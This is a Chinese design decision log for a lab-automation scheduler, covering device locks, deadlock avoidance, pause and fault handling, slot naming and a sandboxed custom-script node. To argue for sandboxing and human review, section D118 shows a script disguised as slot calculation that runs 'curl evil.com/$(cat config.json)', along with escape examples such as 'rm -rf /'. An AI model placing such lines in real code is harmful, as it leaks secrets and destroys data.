## D101. 岛锁 → 设备锁

**决策时间**：2026-11-02
**触发**：用户指出"一个岛有多个设备，流程很长，需要并发多实验才高效"

### 问题

最初用**岛级互斥**：一个岛同时只能跑一个实验。

```
实验 A：孵育 30 分钟（只占孵箱）
实验 B：离心 5 分钟（只占离心机）
岛锁 → B 傻等 30 分钟。纯浪费。
```

### 备选方案

| 方案 | 优点 | 缺点 |
|---|---|---|
| **A. 保持岛锁** | 绝对安全 | 并发 1，效率极低 |
| **B. 设备锁** | 粒度正好 | 要维护每台设备的占用 |
| **C. 无锁** | 最快 | 必然撞车 |

### 选择：B

**理由**：岛里**只有机械臂是真共享的**（一次搬一块板），
其他设备（孵箱/离心机/读板机）可以并行。

**实现**：

```sql
UPDATE device_state SET current_run_id = ?, status = 'running'
WHERE resource_id = ? AND (current_run_id IS NULL OR current_run_id = ?)
RETURNING resource_id
```

**代价**：
- 需要维护 `current_run_id`（有孤儿锁风险，见 D102）
- 抢不到时要重试/排队

**效果**：4 并发从 1 成功 3 拒绝 → **4 全成功**，总耗时 8.78 秒。

## D102. 机械臂是"瞬时资源"，不是"独占资源"

**决策时间**：2026-11-02
**触发**：用户指出"机械臂搬完就是空闲，可以被其他流程调用"

### 关键认知

机械臂和孵箱**性质不同**：

| 设备 | 占用特征 |
|---|---|
| **孵箱** | 占 30 分钟（任务全程） |
| **离心机** | 占 5 分钟（任务全程） |
| **机械臂** | 占 **几秒到几十秒**（只在搬运动作期间） |

**如果按"任务全程占用"来锁机械臂，整个岛就退化成串行**——
因为每个实验都要搬板，一个实验跑 30 分钟，机械臂就被占 30 分钟。

### 实现：步级抢/释放

`DeviceLock` 在 **`onStepStart` 抢、`onStepDone` 释放**——**每个动作单独锁**。

```
Transfer 开始 → 抢机械臂 → 搬完 → 释放     ← 只占 2-5 秒
等 B 执行 30 分钟 → 机械臂空闲              ← 不占
```

**实测验证**：

```
设备        能力       锁归属
ID1731     TRANSFER   (空)      ← 搬完就释放 ✅
ID1731-2   TRANSFER   (空)
```

### 代价与风险

**代价**：机械臂频繁抢/放，有锁开销（每次一条 UPDATE，约 1-2ms）。

**风险**：**锁泄漏**——如果 `onStepDone` 没触发（线程被 kill、代码路径异常），
机械臂会永久被占。

**对策**：心跳里定期清孤儿锁（见 D103）。

## D103. 孤儿锁：心跳清理 + 枚举比较的坑

**决策时间**：2026-11-02
**触发**：实测发现两台 INCUBATE 设备挂着 10 小时前的 runId

### 问题

```
ID1183  current_run_id = 204994   ← 这个 run 早就 completed 了
```

**后果**：那台设备**永久不可用**，直到重启服务。

**根因（三个）**：

1. 执行线程被 `kill -9`，finally 跑不到
2. 走了不走 `onStepDone` 的代码路径
3. **释放时 `runId` 对不上**（两套 ID 转换出错）

### 实现

心跳每 10 秒清一次：

```sql
UPDATE device_state ds SET current_run_id = NULL, status = 'idle'
WHERE ds.current_run_id IS NOT NULL
  AND EXISTS (SELECT 1 FROM run r WHERE r.id = ds.current_run_id
              AND r.status::text IN ('completed','failed','aborted','cancelled'))
```

### 踩的坑：枚举比较要 `::text`

第一次写的是 `r.status IN (...)`，**SQL 静默失败**（异常被 catch 吞了），
手工执行才发现要加 `::text`：

```sql
-- 错（枚举和字符串字面量比较，类型不匹配）
AND r.status IN ('completed', ...)

-- 对
AND r.status::text IN ('completed', ...)
```

**教训**：`catch (SQLException e) { return 0; }` 会掩盖所有 SQL 错误。
清理类操作至少要打日志。

## D104. 变量隔离：ThreadLocal + 必须清理

**决策时间**：2026-11-02
**触发**：并发验证后意识到 `withVars` 是进程级共享 Map

### 问题

`WorkflowService` 是单例，`runtimeVars` / `islandFilter` 是普通字段：

```
A 线程：withVars({"plate": "A-1"})
B 线程：withVars({"plate": "B-1"})     ← 覆盖 A 的
A 线程：substVars("${plate}") → "B-1"  ❌
```

### 备选方案

| 方案 | 优点 | 缺点 |
|---|---|---|
| **A. 显式传参** | 最干净，无隐式状态 | `substVars` 在 `loadMethodParams` 深处，要改 4-5 个方法 |
| **B. ThreadLocal** | 改动集中 | 必须记得清理，否则线程池复用会串 |

### 选择：B（暂时）

**理由**：改动集中在 `WorkflowService` 一个类，不动调用链。

**代价**：**必须在 finally 里 `clearVars()`**，两处都补了：
- `ApiServer.workflowRunJson`
- `ExperimentExecutor.run`

**未来如果重构**：应该改成显式传参（A），ThreadLocal 是妥协。

## D105. 回程位置死锁：returnTo + 双锁

**决策时间**：2026-11-02
**触发**：用户指出"实验 1 把板搬到 B，实验 2 占了 A 的位置，实验 1 回来没地方放"

### 死锁时序

```
① 实验 1 取板：A 的 L1 空了
② 实验 2 看到 L1 空 → 往 L1 放板      ← 冲突
③ 实验 1 回来：L1 被占，无处可放
```

### 根因（关键）

**不是锁没生效，是锁的语义不够**：
位置锁只管"此刻这个位置有没有板"，**不管"这块板将来要回哪"**。

### 备选方案

| 方案 | 优点 | 缺点 |
|---|---|---|
| **A. 加 `returnTo` 字段，取板时双锁** | 根治 | 降低并发（占两个位置） |
| **B. 抢不到就找替代位置** | 并发高 | 板子可能不回到预期位置，要告警 |
| **C. 不做，靠人工处理** | 零成本 | 死锁时要人介入，代价更大 |

### 选择：A 为主，B 为降级

**理由**：死锁的代价（人介入、产线停）远大于并发损失。

**实现**：

```json
{
  "method": "Transfer",
  "params": {
    "source": "ID1775",
    "target": "ID1183",
    "returnTo": "ID1775"        ← 不配则默认等于 source
  }
}
```

取板时：

```java
tryReserveTransfer(sourceId, returnSlotId, runId, ttl);
// 已有的双锁 API，按 id 升序申请（防循环等待）
```

**代价**：占两个位置，并发上限降低。

**可选逃生**：`reserveReturn: false` 显式关闭，由编排的人承担风险。

## D106. 时长预估不准怎么办

**决策时间**：2026-11-02
**触发**：用户问"预估时长可能不精准，如何做动态规划"

### 核心认知

**不要依赖精确值做决策**，要依赖**相对顺序**和**保守估计**。

### 四个手段

#### ① 不用绝对值，用区间

```
孵育：base=3600s，乐观 3000s，悲观 5400s
```

**TTL 按悲观值算**（宁可多占一会儿，也不要中途失效）。

#### ② 滚动重算（rolling horizon）

**每执行完一步，用实际耗时修正预估**：

```
预估：Transfer 45s，实际 62s
修正：后续同类动作的预估 × 1.38
```

**这就是"滚动时域"的实际做法**——不是一次算完全程，是走一步看一步。

#### ③ 分支后重规划

**遇到 `exclusiveGateway`，判定后只规划选中的分支**：

```
     ┌─ 分支 A（走这条）→ 重规划后续
判定 ┤
     └─ 分支 B（不走）  → 不做任何预留
```

**为什么重要**：未选中的分支如果也预留资源，会**凭空占用位置和设备**。

**实现**：`GraphRunner` 走完判定节点后，清掉另一条分支的预留意向。

#### ④ 保守 + 让路

**冲突时的优先级**：

| 情况 | 策略 |
|---|---|
| 短任务 vs 长任务抢同一资源 | **短任务优先**（长任务本来就占得久，让它多等一会儿损失小） |
| 有 deadline 的 vs 没 deadline 的 | **有 deadline 优先**（EDD，已实现） |
| 都急 | **按优先级字段**（已实现） |

### 一句话

> **预估准不准不重要，重要的是"错了能纠正"**。
> 滚动重算 + 保守 TTL + 短任务优先，让错误不会累积成死锁。

## D107. 前瞻：预先整理后续要用的板子

**决策时间**：2026-11-02
**触发**：用户提出"把流程后面使用的板子都整理出来"

### 做什么

执行前扫描后续节点，得出：

```json
{
  "plates": ["PL-001"],
  "positions": [
    {"position": "ID1183-L1", "action": "target", "atStep": 3},
    {"position": "ID1775-L2", "action": "return", "atStep": 5}
  ],
  "devices": [
    {"device": "ID1183", "neededAt": "step3"},
    {"device": "ID1731", "neededAt": "step2,step4"}
  ]
}
```

### 有什么用

| 用途 | 说明 |
|---|---|
| **提前预留** | 只在需要前 N 分钟预留，不是一开始全占 |
| **冲突检测** | 开跑前就知道"这个流程要的位置被别的实验占着" |
| **时长估算** | 把各动作的 `duration_model` 累加，得到预期总时长 |

### 为什么不能"一开始全预留"

**会把整个岛锁死**——一个 10 步流程可能要 5 个位置，全占上别人没法跑。

**正确做法**：**滚动预留**——只预留"下一步要用的"，
用完了就释放，再预留后续的。

## D109. 三层资源模型 + 等待图死锁检测（根治方案）

**决策时间**：2026-11-02
**触发**：用户指出两个 `returnTo` 解决不了的场景

### 场景 1：B 一个出入口 + 多个内部位置

```
B 有 3 个内部位置
流程1：板1 进 B 位置1
流程2：板2 进 B 位置2      ← 应该能并行
```

**如果锁"B 这台设备"，流程2 进不去** —— 锁的粒度错了。

### 场景 2：A→B→C→A 环，3 个流程

```
流程1 占 A 等 B
流程2 占 B 等 C
流程3 占 C 等 A
→ 环，必死锁
```

`returnTo` 双锁只能防单链路的"回程位置被占"，**防不了环**。

### 备选方案

| 方案 | 能否根治 | 实现代价 |
|---|---|---|
| A. 加 `returnTo` | 只解决单链路 | 2 天 |
| B. 超时 + 回滚 | 死锁后能恢复，但仍会撞 | 3 天 |
| **C. 三层资源 + 等待图** | **理论上无死锁** | **2 周** |
| D. 完整银行家算法 | 最彻底 | 需要预知最大需求，流程有分支做不到 |

### 选择：C

**理由**：银行家算法要求"预知最大需求"，而流程有分支、时长不准，
**这个前提在本项目不成立**。等待图只记录"谁在等谁"，不需要预知未来。

**资源分三层**：

| 层 | 资源 | 共享性 | 占用时长 |
|---|---|---|---|
| L1 位置 | 每设备 N 个 | **独立** | 任务全程 |
| L2 出入口 | 1 个/设备 | 共享 | **动作级**（几秒） |
| L3 机械臂 | 1 个/岛 | 共享 | **动作级**（2-5 秒） |

**关键**：L2/L3 都是"瞬时资源"，只在动作期间占，不是任务全程。
这解决了"机械臂搬完就该空闲"的问题。

**死锁检测**：抢不到时加边（P→Q），DFS 检测成环，成环就拒绝。

### 代价

| 代价 | 说明 |
|---|---|
| 误拒 | 某些本可过的申请被保守拒绝 |
| 复杂度 | 三层模型 + 等待图，调试难 |
| 开销 | 每次分配多一次环检测（微秒级） |

### 优化：单实验时关掉

**没有并发就不会死锁**，检测是纯浪费。

```
LABOS_DEADLOCK_GUARD=auto   默认：running > 1 才启用
LABOS_DEADLOCK_GUARD=on     强制开
LABOS_DEADLOCK_GUARD=off    强制关
```

### 状态

**设计完成（`docs/资源模型与死锁避免-设计.md`），代码未实现。**

分三批：
1. 资源模型（1 周）—— 解决场景 1
2. 等待图检测（1 周）—— 解决场景 2
3. 兜底与可观测（3 天）

## D110. 暂停只能在"动作边界"

**决策时间**：2026-11-02
**触发**：用户问"机械臂抓着板子时能停吗"

### 问题

机械臂从 A 抓板、移到半空 → 能停在这里等人工吗？

**不能。板会掉。** 机械臂的结构不允许悬停承重。

### 方案：安全暂停点

```
节点1 [动作1] [动作2] [动作3] → 节点2 ...
            ↑        ↑        ↑
         可暂停   可暂停    可暂停     ← 只有动作之间
```

**动作执行期间，暂停请求只标记不生效**。

### 代价

**暂停响应的延迟** = 当前动作的剩余时间。
最长可能是孵育的 30 分钟——**但这没办法，物理约束**。

### 例外：人工急停

**急停是物理按钮**，系统拦不住。后果是板位置未知（见 D112）。

## D111. 故障不全停，看依赖

**决策时间**：2026-11-02
**触发**：用户问"一个设备故障，其他并行实验要不要也暂停"

### 答案：分情况

| 故障对象 | 影响范围 |
|---|---|
| **普通设备**（孵箱/离心机） | 只有用它的流程 |
| **机械臂** | 需要搬运的流程（物流断了），但**正在执行的动作要跑完** |
| **板位置 UNKNOWN** | 所有涉及这块板的流程 |

### 但暂停时必须释放资源

**被暂停的执行如果还占着资源，会把整个岛拖死**：

```
流程1 用 B 时故障暂停，但还占着 A 的位置
  → 流程2 想用 A，抢不到，也卡住
```

**释放规则**（含评审 R2 修正的豁免）：

| 资源 | 暂停时 | 为什么 |
|---|---|---|
| 普通"已占但未用"的位置 | **释放** | 让别的流程能跑 |
| **回程预留位** | **⚠ 保持，不释放** | 见下方 R2 修正 |
| 机械臂（没抓板） | **释放** | 不占着 |
| 机械臂（抓板中） | **保持** | 不能松手 |
| 正在用的设备锁 | **保持** | 板可能还在里面 |

#### ⚠ R2 修正：回程预留位必须豁免

**评审指出的硬矛盾**：

- D105 要求取板时**全程预留回程位置**
- D111 要求故障暂停时**释放"已占但未用"的位置**
- **回程预留位恰恰是"已占但未用"**

**如果照 D111 释放**：

```
① 取板，预留回程位 L1
② 设备故障 → 暂停 → 按 D111 释放 L1
③ 故障修复 → 恢复 → 要放回 L1，但 L1 已被别人占了
④ 形态 1 死锁原样复现
```

**规范**：**回程预留位的语义是"承诺"，不是"预留"**。

| 语义 | 含义 | 能否因暂停释放 |
|---|---|---|
| **预留**（reservation） | "我可能会用" | ✅ 可以释放 |
| **承诺**（commitment） | "我一定会用，不给我就死锁" | ❌ **不能释放** |

**实现**：`resource_booking.source_type` 区分两类：

```sql
source_type = 'position-reserve'   -- 普通预留，暂停可释放
source_type = 'position-return'    -- 回程承诺，暂停必须保持
```

**暂停时的释放 SQL 要排除第二类**：

```sql
DELETE FROM resource_booking
WHERE reserved_by_run = ? AND status = 'active'
  AND source_type <> 'position-return';   -- ← 豁免
```

**代价**：暂停的执行仍占着回程位，会影响并发。
**但这是必要的**——不占就会死锁，死锁的代价更大。

### 和银行家算法的关系

故障改变了可用资源，**已算出的安全序列可能不成立，要重算**。

但**不能因为"重算不安全"就中断正在执行的动作**：

```
孵育到一半，重算发现不安全 → 能停吗？
  → 不能，强行停会毁掉样本
```

**所以安全检测只管"新申请"，不管"已占着在用的"** ——
这是"不可抢占资源"的现实约束，理论基础假设可抢占，物理世界不允许。

## D112. 板位置三态：KNOWN / UNKNOWN / LOST

**决策时间**：2026-11-02
**触发**：用户问"机械臂被人工停止并发出错误指令，状态怎么处理"

### 问题

```
机械臂抓着板，被人工按了急停
  → 板在哪？机械臂上？半空？掉地上了？
  → 系统完全不知道
```

### 方案：位置三态

| 状态 | 含义 | 产生 | 处理 |
|---|---|---|---|
| **KNOWN** | 明确在某位置 | 正常动作完成 | 正常调度 |
| **UNKNOWN** | 不知道在哪 | 搬运中异常 | **人工盘点**，所有涉及这板的流程暂停 |
| **LOST** | 确认丢了 | 人工盘点确认 | 终止相关流程，走损耗流程 |

### 关键：不猜

**绝不能说"板还在机械臂上"** —— 可能掉地上了，可能被人拿走了。

**`UNKNOWN` 必须人工介入**，系统不做任何假设。

### 恢复要带状态校正

人工处理完，现场和系统记录大概率不一致：

```json
POST /api/runs/{runId}/resume
{
  "action": "continue",
  "corrections": {
    "plate_position": {"plate": "PL-001", "now_at": "ID1183-L1"}
  }
}
```

**不校正就继续，后面的板位判断全错。**

## D113. 人工介入的状态机

**决策时间**：2026-11-02

### 三种暂停态

| 状态 | 触发 | 恢复条件 |
|---|---|---|
| `paused_fault` | 设备故障 | 设备心跳恢复 |
| `waiting_human` | 需人工处理（重试耗尽、板位不一致） | 人工调 resume |
| `paused_unknown` | 板位置未知 | 人工盘点 + 校正 |

### 为什么要分三种

**恢复条件不同**：

- `paused_fault`：设备好了就自动继续（不需要人确认）
- `waiting_human`：**必须人确认**（系统不知道人处理了没有）
- `paused_unknown`：**必须盘点**（位置完全未知，比前两种严重）

**混成一个状态会导致**：设备恢复了但没人知道，或者人以为处理了其实没处理。

### 恢复接口

```
POST /api/runs/{runId}/resume
  ?action=continue   继续
  &action=retry      重试当前动作
  &action=skip       跳过（危险，二次确认）
  &action=abort      终止
```

**必须由人触发** —— 系统不能自己猜"是不是处理好了"。

## D114. 最终方案：主链粗筛 + 等待图细管（混合）

**决策时间**：2026-11-02
**触发**：用户看完"为什么不用银行家"后，认可其中提出的混合方案，要求按这个实现

### 方案

| 阶段 | 机制 | 解决什么 |
|---|---|---|
| **启动前** | 主链粗筛（简化银行家，设备粒度） | 点启动时就知道够不够 |
| **执行中** | 等待图细管（三层资源 + 环检测） | 保证不死锁 |

### 为什么最终选混合而不是纯等待图

**纯等待图的问题**：用户点了启动 → 系统接受 → 跑 5 分钟 → 卡在抢设备上 → **"点了没反应"**。

**混合的定位**：

| 机制 | 算错了会怎样 |
|---|---|
| 主链粗筛 | **只是体验差**（下次排队），不影响正确性 |
| 等待图细管 | **必须正确**（安全底线） |

**核心原则：粗筛可以错，细管不能错。**

### 主链怎么定

三种方式按优先级：

1. **编排时人工标记**（推荐）——只有编排的人知道业务上哪条是常态
2. **自动选资源最重的分支**——没标记时用，偏保守不出错
3. **节点最多**——兜底，只为让算法有确定结果

### 粗筛的资源单元为什么是"设备"不是"位置"

| 用设备 | 用位置 |
|---|---|
| 10 台，算法快 | 80 个，算法慢 |
| 够用（设备是主要瓶颈） | 过度精细 |

**位置冲突由细管（位置锁）处理，粗筛不管。**

### 粗筛错了的兜底

```
粗筛按主链算"要 2 台" → 通过
执行走分支实际要 3 台 → 细管检测
  - 无环 → 等（可能很久，但不会死锁）
  - 成环 → 拒绝，退避重试
  - 一直等不到 → 超时告警"资源饥饿"
```

**结论：粗筛错了最多是"等很久"或"报饿"，绝不会死锁。**

### 代价

| 项 | 纯等待图 | 混合 |
|---|---|---|
| 实现时间 | 2.5 周 | **4 周**（多 1.5 周） |
| 保证不死锁 | ✅ | ✅ |
| 启动时有反馈 | ❌ | ✅ |

### 状态

**设计完成（`docs/混合调度方案-设计.md`），代码未实现。**

实现顺序（不能换）：
1. 三层资源模型（1 周）—— 基础
2. 等待图细管（1 周）—— 安全底线
3. 主链定义（3 天）—— 可与 1 并行
4. 粗筛算法 + 启动接口（1 周）
5. 饥饿告警 + 优先级等待补偿（3 天）

## D115. 点位选择：流程硬编码为主，调度器自动选为可选

**决策时间**：2026-11-02
**触发**：用户指出多入口设备选哪个口的问题，并给出实现取向

### 问题

设备 B 有 IN-1、IN-2 两个入口（或有 8 个层位），流程要放板进去——**选哪个？**

### 备选方案

| 方案 | 优点 | 缺点 |
|---|---|---|
| **A. 调度器自动选空位** | 智能，用户不用管 | **需要设备实时提供占用状态**，不一定支持 |
| **B. 流程硬编码** | 不依赖设备配合，一定能用 | 编排时要写清楚 |
| **C. 循环+变量生成** | 比 B 灵活，一个循环管 8 个位置 | 需要变量替换支持点位 code |

### 选择：B/C 为主，A 为可选

**用户的判断**：

> "这个看我们是写死的比较好，如果能动态规划自然更好，
> 但这个需要另外的设备也跟着来获得我们的信息，**有的时候不一定那么好处理**。
> 所以我们先采用在流程上自己硬编码的方式。"

**实现**：

```json
{
  "nodeType": "loop", "varName": "i", "from": 1, "to": 8,
  "body": [{
    "method": "Transfer",
    "params": { "source": "STACKER", "target": "ID1183-L${i}" }
  }]
}
```

**展开成 8 步**，每步 `target` 不同，机械臂按 code 查坐标。

### 这要求什么

| # | 要求 | 现状 |
|---|---|---|
| 1 | 变量替换能用在 target/source | ✅ 已有 |
| 2 | 循环节点展开成多步 | ✅ 画布有循环 |
| 3 | **查点位前先替换变量** | ⚠ **M1 要补** |

### 自动选位保留为可选

```json
{ "target": "ID1183", "autoPickSlot": true }
```

**默认关闭**——因为依赖设备配合，不一定可靠。

### 用户的原话说明了为什么

> "**这也是为什么需要有条件、计算等来修改变量**，
> 从而达到更好的处理流程和点位的目的。"

**所以流程层要有**：
- **条件**（`exclusiveGateway` + `${plateCount} > 0`）
- **计算**（`compute` 节点：`nextSlot = ${usedSlots} + 1`）
- **循环**（`loop` + `${i}`）

**这些都是"修改变量"的手段**，点位由变量拼出来。

**调度器的职责**：给一个 `target=ID1183-L3`，就去抢 L3、开 L3 的门、搬过去。
**选哪个位置是流程的事，不是调度器的事。**

## D116. 点位编号是"我们和机械臂的约定"，必须正式定义

**决策时间**：2026-11-02
**触发**：用户说明"设备的点位编号、顺序等都是我们和机械臂的约定"

### 问题

如果编号规则不明确，会出现：

```
公式算出 ID1183-L1
机械臂理解 L1 = 最底层
中控理解 L1 = 最顶层
→ 板放错层，可能撞机
```

### 规范

**格式**：`{设备编号}-{类型}{序号}`

| 形态 | 格式 | 例子 |
|---|---|---|
| 多板位 | `{dev}-L{n}` | `ID1183-L3` |
| 多入口 | `{dev}-IN{n}` | `ID1775-IN2` |
| 多出口 | `{dev}-OUT{n}` | `STACKER-OUT1` |
| 单口 | `{dev}-BOTH` | `ID1731-BOTH` |
| 堆叠 | `{dev}-S{n}` | `STACKER-S5` |
| 停靠 | `{dev}-DOCK` | `ID1731-DOCK` |

**序号从 1 开始**（不是 0，和"第几层"的自然语言一致）。

**顺序约定**（需机械臂侧确认）：

| 设备类型 | `L1` 含义 | 递增方向 |
|---|---|---|
| 垂直层架 | 最底层 | 向上 |
| 水平托盘 | 最外侧（靠门） | 向内 |
| 深孔板塔 | 最下面 | 向上 |
| 多入口 | 最靠待机位 | 由近及远 |

**选"从底层/外层开始"的理由**：机械臂行程最短、取外层不挡内层、
和先进先出的物流直觉一致。

### 流程里怎么算

```json
{ "nodeType": "loop", "varName": "i", "from": 1, "to": 8,
  "body": [{ "method": "Transfer",
             "params": { "target": "ID1183-L${i}" } }] }
```

**表达式能力要求**（够用就好，故意不支持复杂函数）：
算术 `+ - * /`、取整 `floor`、条件 `? :`、字符串拼、取余 `%`。

### 校验三层

| 层 | 能查什么 |
|---|---|
| **编排保存时** | 字面 code（不含 `${}`）直接查是否存在 |
| **执行时** | 替换变量后查，查不到报错并提示可能原因 |
| **定期核验** | 有设备无点位、序号跳号 |

### 解析的坑

设备编号里可能有横杠（`ID1731-2`），所以 `ID1731-2-L1` 解析时要
**从右往左**找第一个 `-L`/`-IN`/`-OUT`/`-S`，不能从头找。

## D117. 编号 vs 访问顺序分离；表达式自己写解析器

**决策时间**：2026-11-02

### D117.1 `L1` 的含义不假设，靠 `order_in_device` 现场配

**用户明确**：

> "L1 现在定不了，不同的位置，需要到现场去定，
> 我们写这个系统，需要对现场很多情况都支持的。"

**曾想过的错误方案**：规定 `L1` 必须是最底层。

**为什么放弃**：

| 问题 | 说明 |
|---|---|
| 设备差异大 | 孵箱垂直层架（从下），读板机水平托盘（从外） |
| 同型号也可能不同 | 有的装反了，有的改过结构 |
| 只有示教时才知道 | 机械臂实际怎么取，现场才清楚 |

**规范**：**编号（code）标识位置，顺序（order_in_device）现场配**。

**两者不一致会怎样**：

| 场景 | 影响 |
|---|---|
| 流程指定具体编号 | **不影响**（直接去那个坐标） |
| 自动选空位 / 批量取 | **必须按顺序**（否则选了被挡住的层） |

**所以 `order_in_device` 在"流程指定编号"时可选，
在"自动选位/批量取"时必填。**

### D117.2 表达式引擎自己写，不引脚本引擎

**需求**：`${usedSlots + 1}`、`${i % 8}`、`${a > b ? 1 : 2}`。

**备选方案**：

| 方案 | 依赖 | 安全 | 代码量 |
|---|---|---|---|
| Nashorn | 无（JDK 15+ 已移除） | 可执行任意 JS | 0 |
| GraalJS | 几十 MB | 可执行任意 JS | 0 |
| AviatorScript | 一个 jar | 可执行脚本 | 0 |
| **自己写** | **无** | **只能算数** | **~300 行** |

**选自己写**：

- **零依赖**（和项目"裸 JDK"取向一致）
- **安全**（不可能执行任意代码）
- **可控**（不支持的东西明确报错，而不是"意外支持了"）

**能力边界（故意不做）**：

| 不做 | 为什么 |
|---|---|
| 字符串函数 | 点位编号是拼接，不需要 |
| 函数定义 | 会变成编程语言 |
| 循环 | 循环是**节点类型**，不是表达式 |
| 对象/数组 | 变量都是标量 |

**原则**：**表达式只做"算一个值"，不做"写逻辑"。**

**工程量**：2.5 天（tokenizer + parser + evaluator + 测试），M1 从 1.5 → 1.75 周。

**错误消息必须带表达式原文**：

```
变量未定义：usedSlots（表达式 usedSlots + 1）
表达式求值失败：除数为 0（表达式 1 / 0）
表达式语法错误："1 + "（位置 3：缺少操作数）
```

## D118. 自定义脚本节点：独立进程沙箱，生产默认关闭

**决策时间**：2026-11-02
**触发**：用户提出"某个节点需要一段 Java 代码，读状态、做处理、结果放进变量"

### 需求确实存在

**表达式只能"算一个值"，不能"查东西"**：

```
${a + b}            ✅ 表达式能算
${查哪些位置空着}     ❌ 表达式不能查
${调 LIMS 接口}      ❌ 表达式不能调
```

### 四级方案

| 方案 | 安全 | 灵活 | 工程量 |
|---|---|---|---|
| A. 主进程直接执行上传的 .java | ❌ 极低 | 极高 | 小 |
| B. 类加载器隔离 | 🟡 低（能反射绕过） | 极高 | 中 |
| C. **独立进程 + 受限 API** ⭐ | 🟡 中 | 高 | 中 |
| D. 只允许预置插件 | ✅ 高 | 低 | 小 |

**选 C**。

### 为什么类加载器隔离不行

**同一 JVM 里任何沙箱都能绕过**：

| 绕过方式 | 后果 |
|---|---|
| `System.exit(0)` | 杀掉中控 |
| `Runtime.exec("rm -rf /")` | 执行系统命令 |
| `Thread.sleep(Long.MAX)` | 卡死线程 |
| 反射 `Class.forName("com.labos...")` | 访问内部类 |
| SecurityManager | **JDK 17 废弃，21 移除** |

**只有进程隔离能兜底**（至少能 kill）。

### 沙箱措施

| 措施 | 实现 |
|---|---|
| 独立进程 | `java -cp labos-script-api.jar:user.jar`，不继承主 classpath |
| 受限 API | 只有 `ScriptContext`（读变量、只读查询、日志） |
| 超时 | 5 秒 `destroyForcibly` |
| 内存 | `-Xmx256m` |
| CPU | `-XX:ActiveProcessorCount=1` |
| 无网络/无 DB | **API jar 里就没有这些依赖** |
| 工作目录 | 临时目录 |

**挡不住的两条**（进程级沙箱的极限）：

| 坏事 | 只能靠 OS |
|---|---|
| `Runtime.exec` | 独立系统用户 + `ulimit` |
| 读写绝对路径 | 只读挂载 / SELinux |

**所以生产环境需要 OS 级配合，不只是代码。**

### 外部系统访问：只能"请求"，不能"自己发"

```java
// 用户代码
String sample = ctx.fetchExternal("LIMS", "sample/" + id);

// 主进程只允许白名单
Map<String, ExternalDataSource> allowed = Map.of("LIMS", limsClient);
```

**用户代码碰不到 HTTP 客户端**。

### 分级开启

| 环境 | 脚本功能 |
|---|---|
| 开发/演示 | 开启，接受风险 |
| 测试 | 开启，独立用户 |
| **生产** | **默认关闭**，需管理员开启 + 审核 |

### 为什么必须人看源码

```java
// 看起来在算点位
public Map<String, Object> run(ScriptContext ctx) {
    ctx.log("calculating...");
    Runtime.getRuntime().exec("curl evil.com/$(cat config.json)");
    return Map.of("slot", "L1");
}
```

**任何静态分析都可能漏，只有人看最可靠。**

### 强制声明 outputs

```json
{ "outputs": ["nextSlot"] }
```

**脚本返回的变量必须在 `outputs` 里声明过，否则报错** ——
防止脚本偷偷改别的变量污染上下文。

### 性能代价

**每次起 JVM 要 200-500ms**。一个流程里 10 个脚本节点 → 2-5 秒。

**优化选项：常驻进程池** —— 但那又降低隔离性。

**取舍：隔离 vs 性能。**

### 实施分级

| 级别 | 内容 | 估时 |
|---|---|---|
| **L1**（现在做） | 表达式引擎 | **2.5 天** |
| **L2**（看需求） | 脚本节点全套 | **3 周** |

**建议先做 L1** —— L2 风险最高、工程量是 8 倍，
多数"动态"需求用表达式 + 循环就够。

### 状态

**设计完成（`docs/自定义脚本节点-设计.md`），未实现。**

## D119. 异步结果查询：结果表 + 变量注入，不需要脚本沙箱

**决策时间**：2026-11-02
**触发**：用户提出"查询当前正在运行的实验的结果，结果可能异步产生，
用到时再查、处理、做动态更新"

### 先分清三种"查询"

| 查什么 | 需要什么 | 风险 |
|---|---|---|
| **① 本系统的异步结果** | **结果表 + 变量注入** | ✅ 无 |
| ② 本系统的实时状态 | 受限查询 API | ✅ 低 |
| ③ 外部系统（LIMS） | 脚本 + 白名单 | 🟠 中 |

**用户场景是 ①**，**不需要上传代码，不需要沙箱**。

### 方案

**① `run_result` 表存异步结果**

```sql
run_result (run_id, node_id, result_key, payload jsonb, source, created_at)
UNIQUE (tenant_id, run_id, result_key)
```

**② 变量注入：每个节点执行前注入**

```
results.readPlate.od        = 0.65
results.readPlate.plate     = "PL-001"
results.readPlate.__exists  = true
```

**③ 表达式直接引用**

```json
{ "condition": "${results.readPlate.od > 0.5}" }
```

**④ 结果没出来时等待**

```json
{ "waitFor": { "results": ["readPlate"], "timeoutMs": 600000,
               "pollMs": 2000, "onTimeout": "pause" } }
```

### 三个设计要点

**1. 等待时必须释放资源**

```
等 10 分钟期间，机械臂、通道、位置都要放掉
只保留设备锁（板可能还在设备里）
run.status = 'waiting_result'
```

**不释放的话，等 10 分钟会卡死整个岛。**

**2. 区分"没出来"和"值为 null"**

```
results.readPlate.__exists = false   ← 结果还没出来
```

**或者用 `has('readPlate')` 函数**。

**否则表达式求值会报"变量未定义"，掩盖真实情况。**

**3. 结果有有效期**

```json
{ "output": "readPlate", "validForMs": 7200000 }
```

**过期的结果 `has()` 返回 false**。

**为什么**：用 2 小时前的读板结果判定阳性/阴性，
**依据可能已经失效而不自知**。

### 默认 `onTimeout` = pause

| 值 | 行为 | 适用 |
|---|---|---|
| fail | 执行失败 | 简单但需人工重跑 |
| skip | 当作没结果继续 | 可能走错分支 |
| **pause** ⭐ | 暂停等人 | 结果重要时 |

**默认 pause** —— 结果往往是判定依据，猜错的代价大。

### 实施：M1 加 3 天

| 任务 | 估时 |
|---|---|
| `run_result` 表 + 从 output 配置写入 | 1 天 |
| 变量注入（results.&lt;key&gt;.&lt;field&gt;） | 1 天 |
| `waitFor` + 轮询 + 超时 + 释放资源 | 1 天 |
| `has()` 内置函数 | 0.5 天 |

**M1 从 1.75 → 2.1 周。**

### 和脚本的关系

```java
if (需求可以表达为"对已有变量的运算") {
    表达式;          // 安全、快
} else if (需求是"查本系统的结果/状态") {
    waitFor + 变量注入;   // 安全、中等快
} else {
    脚本;            // 有风险、慢
}
```

**用户这个场景落在第二类，不需要脚本。**
